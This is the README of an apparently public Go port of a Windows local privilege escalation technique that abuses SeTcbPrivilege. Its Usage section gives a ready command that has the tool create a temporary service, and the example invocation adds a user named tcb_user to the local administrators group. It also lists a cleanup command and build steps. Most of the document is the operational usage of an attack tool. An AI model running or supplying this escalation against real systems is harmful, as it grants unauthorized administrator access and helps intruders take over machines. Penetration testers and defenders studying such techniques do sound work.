# SeTcbPrivilege Local Privilege Escalation

This repository contains a **Go** translation of a local privilege escalation (**LPE**) technique involving the **SeTcbPrivilege**. The original proof-of-concept is available at https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178.

## Usage

The following will create and start a service called "AAATcb" that will execute the provided command.
```batch
.\tcb.exe "C:\Windows\system32\cmd.exe /c net localgroup administrators tcb_user /add"
```

The service is deleted automatically after program execution. To delete it manually, you can use the "clean" command:
```batch
.\tcb.exe clean
```

## Build

```bash
git clone https://github.com/CharminDoge/tcb-lpe
cd tcb-lpe
make
```
